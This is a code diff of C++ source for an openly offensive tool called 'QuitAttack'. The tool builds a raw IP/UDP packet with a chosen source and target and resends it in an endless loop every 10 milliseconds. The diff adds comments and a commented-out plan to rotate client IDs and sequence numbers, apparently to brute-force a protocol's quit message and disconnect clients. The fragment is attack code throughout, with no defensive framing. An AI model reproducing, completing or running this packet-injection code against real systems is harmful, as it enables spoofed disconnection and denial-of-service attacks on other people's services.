@@ -38,7 +38,7 @@
 
 #define HELP "Usage: QuitAttack [-c <client port>] [-p <server port>] [-n <seq num>] [-v <version>] -s <source> -t <target>"
 
-#define MAX_CLIENT_ID 255
+#define MAX_CLIENT_ID 255 // Version 1
     
 using namespace std;
 
@@ -264,17 +264,29 @@ int main (int argc, const char * argv[]){
 		perror("setsockopt");
 		exit(1);
 	}
-    
+
+	// Set destination address
 	memset(&sin, 0, sizeof(sin));
 	sin.sin_family = AF_INET;
 	sin.sin_addr.s_addr = ip->ip_dst.s_addr;
     
     while (true) {
         cout << "." << flush;
+		
+		// TODO: Rotate attack payloads (clientID & seqnum)
+		/*
+		for (int i = 0; i <= MAX_CLIENT_ID; i++) {
+			msg.setClientID(i);
+			msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
+		}
+		*/
         if (sendto(sd, packet, totLen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
             perror("sendto");
             exit(1);
         }
+		
+		
+		
         usleep(10000);
     }
 
